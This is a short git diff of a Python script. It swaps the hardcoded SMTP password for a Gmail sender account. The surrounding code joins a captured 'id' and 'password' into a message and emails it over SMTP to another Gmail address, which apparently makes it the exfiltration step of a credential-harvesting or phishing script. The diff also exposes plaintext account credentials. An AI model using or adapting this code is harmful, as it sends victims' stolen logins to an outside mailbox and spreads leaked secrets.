@@ -14,7 +14,7 @@ def main():
             password = 'null'
         message = f"{id}  {password}"
         from_address = "jacksonshe666999@gmail.com"
-        password = 'RC4ZM5j9naWtTRX'
+        password = '6322@Jackson'
         email = 'kiztopia.2020@gmail.com'
         context = ssl.create_default_context()
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
